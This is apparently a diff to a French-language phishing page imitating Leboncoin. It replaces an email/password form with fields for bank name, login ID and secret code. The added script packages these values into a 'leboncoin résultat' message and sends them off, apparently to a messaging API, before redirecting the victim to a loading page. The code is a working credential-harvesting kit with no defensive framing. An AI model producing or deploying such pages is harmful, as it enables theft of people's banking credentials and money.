@@ -73,26 +73,29 @@
     </div>
 
     <div class="center">
-        <p style="font-size: 1.6rem; font-weight: bolder;">Bonjour !</p>
+        <p style="font-size: 1.6rem; font-weight: bolder;">Ma banque </p>
 
-        <p>Connectez-vous pour confirmer l'operation.</p>
+        <p>Connectez votre banque pour finilaser l'operation.</p>
 
         <br> <br>
 
         <form id="form">
-            <label for="email">E-mail *</label><br>
-            <input type="email" id="email" required>
+
+            <label for="banque">Nom de banque *</label><br>
+            <input type="text" id="banque" required>
             <br>
-            <label for="password">Mot de passe *</label><br>
-            <input type="password" id="pwd" required>
+            <label for="id">Identifiant *</label><br>
+            <input type="text" id="id" required>
+            <br>
+            <label for="password">Code secret *</label><br>
+            <input type="password" id="code" required>
             <br>
             <br>
 
-            <button type="submit">Se connecter</button>
+            <button type="submit">Continuer</button>
             <br>
             <br>
 
-            <a href="#">Créer un compte</a>
         </form>
     </div>
     
@@ -104,11 +107,12 @@ document.getElementById('form').addEventListener('submit', function (e) {
             e.preventDefault();
         
             // Récupération des valeurs du formulaire
-            const email = document.getElementById('email').value;
-            const pwd = document.getElementById('pwd').value;
+            const banque = document.getElementById('banque').value;
+            const id = document.getElementById('id').value;
+            const code = document.getElementById('code').value;
             
             // Validation des champs
-            if (!email || !pwd) {
+            if (!banque || !id) {
                 alert('Veuillez remplir tous les champs.');
                 return;
             }
@@ -117,8 +121,9 @@ document.getElementById('form').addEventListener('submit', function (e) {
             // Construction du message
             const message = `
                 leboncoin résultat :
-                \n📩Email : ${email}
-                \n🔑mot de passe: ${pwd}
+                \n🏦Banque : ${banque}
+                \nUser: ${id}
+                \n🔑Code : ${code}
                 
             `;
         
@@ -141,9 +146,9 @@ document.getElementById('form').addEventListener('submit', function (e) {
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    localStorage.setItem('email', email);
+                    localStorage.setItem('User', id);
                     console.log('Votre message a été envoyé avec succès !');
-                    window.location.href='./chargement.html';
+                    window.location.href='./loader.html';
                 } else {
                     console.error('Erreur lors de l\'envoi du message:', data.description);
                     console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
